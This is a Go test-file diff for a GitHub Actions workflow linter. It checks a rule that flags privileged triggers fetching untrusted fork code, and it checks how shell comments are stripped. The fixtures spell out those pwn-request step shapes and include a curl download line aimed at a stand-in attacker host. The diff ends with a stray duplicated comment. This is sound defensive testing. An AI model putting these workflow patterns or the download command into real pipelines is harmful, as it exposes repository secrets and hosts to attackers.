@@ -412,6 +412,11 @@ func TestRulesRunThroughTheEngine(t *testing.T) {
 		{"ppe-007/filtered.yml", nil},
 		{"ppe-008/dispatch-sensitive.yml", []string{Rule8ID, Rule8ID, Rule8ID}},
 		{"ppe-008/dispatch-clean.yml", nil},
+		// The fixture's title echo is a real rule 2 finding, so it is in the
+		// expected sequence rather than papered over by removing the line.
+		{"ppe-009/pwn_request.yml", []string{Rule9ID, Rule2ID, Rule9ID, Rule9ID, Rule9ID, Rule9ID}},
+		{"ppe-009/workflow_run.yml", []string{Rule9ID}},
+		{"ppe-009/negatives.yml", nil},
 		{"ppe-002/injected.yml", []string{Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID}},
 		{"ppe-002/safe.yml", nil},
 		{"ppe-006/split_job.yml", nil},
@@ -1472,3 +1477,262 @@ func TestScriptLinesWithoutTrailingNewline(t *testing.T) {
 		t.Errorf("second line offset = %d, want 4", lines[1].offset)
 	}
 }
+
+// ---------------------------------------------------------------- rule 9
+
+// Rule 9 on its own fixture. Every finding is Block, because the miss is total
+// compromise rather than a foothold.
+func TestRule9PwnRequest(t *testing.T) {
+	file, data := parseFixture(t, "ppe-009/pwn_request.yml")
+
+	assertFindings(t, Rule9(file), []want{
+		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "head.sha")},
+		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "refs/pull/")},
+		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "repository: ${{ github.event")},
+		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "git fetch origin pull")},
+		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "gh run download")},
+	})
+}
+
+// workflow_run is the other privileged trigger, and the untrusted code arrives
+// as artifacts rather than as a checkout.
+func TestRule9OnWorkflowRun(t *testing.T) {
+	file, data := parseFixture(t, "ppe-009/workflow_run.yml")
+
+	assertFindings(t, Rule9(file), []want{
+		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "gh run download")},
+	})
+}
+
+// The negatives, which matter more here than the positives. A plain
+// pull_request job that checks out the pull request's code is the ordinary way
+// to test a pull request, and a git fetch in a release job is not a pwn request.
+func TestRule9Negatives(t *testing.T) {
+	file, _ := parseFixture(t, "ppe-009/negatives.yml")
+
+	if got := Rule9(file); len(got) != 0 {
+		t.Errorf("got %d findings, want 0: %+v", len(got), got)
+	}
+}
+
+// Each of the three shapes has to be found on its own. A rule that only matched
+// one of them would still pass a fixture containing all three, which is why the
+// fixture is five separate jobs and this table checks them one at a time.
+func TestRule9FindsEachShapeSeparately(t *testing.T) {
+	tests := []struct {
+		name string
+		step string
+	}{
+		{"head sha", "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"},
+		{"pull ref", "      - uses: actions/checkout@v4\n        with:\n          ref: refs/pull/${{ github.event.number }}/merge\n"},
+		{"fork repository", "      - uses: actions/checkout@v4\n        with:\n          repository: ${{ github.event.pull_request.head.repo.full_name }}\n"},
+		{"git fetch", "      - run: git fetch origin pull/1/head:pr-1\n"},
+		{"gh pr checkout", "      - run: gh pr checkout 2\n"},
+		{"gh run download", "      - run: gh run download 42\n"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := rule9OnStep(t, tt.step)
+			if len(got) != 1 {
+				t.Fatalf("got %d findings, want 1", len(got))
+			}
+			if got[0].Severity != findings.SeverityBlock {
+				t.Errorf("severity = %q, want Block", got[0].Severity)
+			}
+		})
+	}
+}
+
+// Each head.repo spelling names the fork, so each one is the fetch. The rule
+// matches the parent rather than full_name alone because all four are values a
+// workflow can reach a fork by, depending on whether it wants a repository name
+// or a git URL.
+func TestRule9MatchesEveryHeadRepoSpelling(t *testing.T) {
+	for _, expr := range []string{
+		"${{ github.event.pull_request.head.repo.full_name }}",
+		"${{ github.event.pull_request.head.repo.clone_url }}",
+		"${{ github.event.pull_request.head.repo.ssh_url }}",
+		"${{ github.event.pull_request.head.repo.git_url }}",
+	} {
+		step := "      - uses: actions/checkout@v4\n        with:\n          repository: " + expr + "\n"
+		if got := rule9OnStep(t, step); len(got) != 1 {
+			t.Errorf("%s: got %d findings, want 1", expr, len(got))
+		}
+	}
+}
+
+// The trigger is the gate. The same steps on events a fork cannot reach are not
+// a finding, and that difference is what separates this rule from matching all
+// of CI.
+func TestRule9RequiresAPrivilegedTrigger(t *testing.T) {
+	step := "      - uses: actions/checkout@v4\n        with:\n" +
+		"          ref: ${{ github.event.pull_request.head.sha }}\n" +
+		"      - run: git fetch origin pull/1/head:pr-1\n"
+
+	unprivileged := []struct{ on, reason string }{
+		{"on:\n  pull_request:\n", "a plain pull_request has a read-only token and no secrets"},
+		{"on:\n  push:\n", "a push is not reachable by a fork"},
+		{"on:\n  merge_group:\n", "a merge group is a queued merge, not a fork's code"},
+		{"on:\n  workflow_dispatch:\n", "workflow_dispatch needs write access, which a fork does not have"},
+		{"on:\n  schedule:\n", "a schedule is the repository's own"},
+		{"on: [push, fork]\n", "the list form of an unprivileged event"},
+	}
+	for _, tt := range unprivileged {
+		if got := rule9OnWorkflow(t, tt.on, step); len(got) != 0 {
+			t.Errorf("%s: got %d findings, want 0 (%s)", strings.TrimSpace(tt.on), len(got), tt.reason)
+		}
+	}
+
+	// A workflow with no on: block at all. GitHub treats that as no triggers, so
+	// there is nothing for a fork to reach.
+	if got := rule9OnWorkflow(t, "", step); len(got) != 0 {
+		t.Errorf("no triggers at all: got %d findings, want 0", len(got))
+	}
+
+	privileged := []struct{ on, reason string }{
+		{"on:\n  pull_request_target:\n", "runs in the base repository with its secrets"},
+		{"on:\n  workflow_run:\n    workflows: [Build]\n", "handles a run a fork may have started"},
+	}
+	for _, tt := range privileged {
+		if got := rule9OnWorkflow(t, tt.on, step); len(got) != 2 {
+			t.Errorf("%s: got %d findings, want 2 (%s)", strings.TrimSpace(tt.on), len(got), tt.reason)
+		}
+	}
+}
+
+// Commands that look like the dangerous ones but are not, so this cannot become
+// a rule that fires on any use of git or gh.
+func TestRule9IgnoresLookalikeCommands(t *testing.T) {
+	for _, script := range []string{
+		"git fetcher --help\n",
+		"gh pr view 2\n",
+		"gh pr list\n",
+		"gh run list\n",
+		"gh run view 42\n",
+		"git checkout pr-1\n",
+		"make fetch\n",
+	} {
+		if got := rule9OnStep(t, "      - run: "+script); len(got) != 0 {
+			t.Errorf("%q: got %d findings, want 0", script, len(got))
+		}
+	}
+}
+
+// A privileged trigger with no untrusted fetch is not this rule. That is the
+// whole legitimate use of pull_request_target: reading a pull request's metadata
+// while running the base branch's code.
+func TestRule9PrivilegedTriggerWithNoFetch(t *testing.T) {
+	src := "on:\n  pull_request_target:\n" +
+		"jobs:\n  review:\n    runs-on: ubuntu-latest\n    steps:\n" +
+		"      - uses: actions/checkout@v4\n" +
+		"      - run: echo \"${{ github.event.pull_request.title }}\"\n"
+	file, err := parse.Parse([]byte(src))
+	if err != nil {
+		t.Fatalf("Parse: %v", err)
+	}
+	if got := Rule9(file); len(got) != 0 {
+		t.Errorf("got %d findings, want 0: %+v", len(got), got)
+	}
+}
+
+// rule9OnStep runs rule 9 over a workflow with one step under a
+// pull_request_target trigger.
+func rule9OnStep(t *testing.T, step string) findings.Findings {
+	t.Helper()
+	return rule9OnWorkflow(t, "on:\n  pull_request_target:\n", step)
+}
+
+// rule9OnWorkflow runs rule 9 over an inline workflow built from a trigger block
+// and a step list, so the trigger tests do not need a fixture each.
+func rule9OnWorkflow(t *testing.T, on, steps string) findings.Findings {
+	t.Helper()
+	src := on
+	if on != "" {
+		src += "\n"
+	}
+	src += "jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n" + steps
+	file, err := parse.Parse([]byte(src))
+	if err != nil {
+		t.Fatalf("Parse: %v", err)
+	}
+	return Rule9(file)
+}
+
+// A comment that documents the command is not the command. This is a Block rule,
+// so matching a line nobody runs is the failure that matters: `# do not forget
+// to git fetch origin main` is an ordinary thing for someone to write.
+func TestRule9IgnoresCommandsInComments(t *testing.T) {
+	for _, script := range []string{
+		"# Update the base branch first.\ngit checkout main\n",
+		"# Run git fetch origin main first.\nmake test\n",
+		"make test  # then git fetch origin main\n",
+		"# gh pr checkout 2\n",
+		"# gh run download 42\n",
+		"#!/bin/sh\ngit checkout main\n",
+	} {
+		if got := rule9OnStep(t, "      - run: |\n"+indent(script)); len(got) != 0 {
+			t.Errorf("%q: got %d findings, want 0", script, len(got))
+		}
+	}
+}
+
+// indent shifts a multi line script under a run: block scalar.
+func indent(script string) string {
+	var out strings.Builder
+	for _, line := range strings.Split(strings.TrimSuffix(script, "\n"), "\n") {
+		// The step marker is written at 6 spaces, so a block scalar body has to
+		// be indented past that to be read as the body rather than as YAML.
+		out.WriteString("          " + line + "\n")
+	}
+	return out.String()
+}
+
+// Stripping comments must not eat the other job of the #. It is also the
+// fragment separator in a URL, it appears inside quoted strings, and it follows
+// an = in an assignment. A # only starts a comment at the start of a line or
+// after whitespace, and each of these has something other than whitespace before
+// it.
+func TestStripShellComment(t *testing.T) {
+	kept := []struct{ in, want, reason string }{
+		{"curl https://evil.example/a#1.2.3.4 -o /tmp/x", "curl https://evil.example/a#1.2.3.4 -o /tmp/x", "URL fragment"},
+		{"echo \"# not a comment\"", "echo \"# not a comment\"", "double quotes"},
+		{"echo '# not a comment either'", "echo '# not a comment either'", "single quotes"},
+		{"TOKEN='#abc'", "TOKEN='#abc'", "an assignment"},
+		{"git fetch origin main", "git fetch origin main", "no hash at all"},
+	}
+	for _, tt := range kept {
+		if got := stripShellComment(tt.in); got != tt.want {
+			t.Errorf("stripShellComment(%q) = %q, want it unchanged (%s)", tt.in, got, tt.reason)
+		}
+	}
+
+	stripped := []struct{ in, want string }{
+		{"# git fetch origin main", ""},
+		{"#git fetch origin main", ""},
+		{"make test # then git fetch", "make test "},
+		{"make test\t# then git fetch", "make test\t"},
+		{"git fetch origin main # get the tags", "git fetch origin main "},
+	}
+	for _, tt := range stripped {
+		if got := stripShellComment(tt.in); got != tt.want {
+			t.Errorf("stripShellComment(%q) = %q, want %q", tt.in, got, tt.want)
+		}
+	}
+}
+
+// The two rules read the same line and have to agree about it. Rule 4 treats an
+// address after a fragment marker as being in the URL's path, and rule 9 has to
+// see the same command, so a fix to comment handling cannot quietly change what
+// one rule sees and not the other.
+func TestCommentStrippingDoesNotChangeURLHandling(t *testing.T) {
+	const line = "curl https://evil.example/a#1.2.3.4"
+
+	if got := literalEndpointMatches(line); len(got) != 1 || got[0].kind != endpointIPInPath {
+		t.Errorf("rule 4 got %+v on a URL with a fragment, want one URL path IP", got)
+	}
+	if got := uncommentedScript(line); got != line {
+		t.Errorf("uncommentedScript(%q) = %q, want it unchanged", line, got)
+	}
+}
+
+// indent shifts a multi line script under a run: block scalar.
